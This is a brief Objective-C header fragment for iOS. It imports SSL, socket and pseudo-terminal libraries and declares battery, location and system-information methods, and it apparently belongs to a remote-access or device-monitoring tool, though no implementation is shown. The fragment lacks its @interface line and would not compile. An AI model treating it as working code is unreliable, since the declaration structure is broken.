#import <Foundation/Foundation.h>
#import <AppSupport/CPDistributedMessagingCenter.h>
#import <AVFoundation/AVFoundation.h>
#import <AudioToolbox/AudioToolbox.h>
#import <CoreFoundation/CFUserNotification.h>
#import <CoreLocation/CoreLocation.h>
#import <MediaPlayer/MediaPlayer.h>
#include <openssl/bio.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <util.h>
#include <sys/ttycom.h>
#include <unistd.h>
#include <dirent.h>

@property (retain) NSFileManager *fileManager;
@property (retain) UIDevice *thisUIDevice;
-(void)getBattery;
-(void)locate;
-(void)sysinfo;
@end
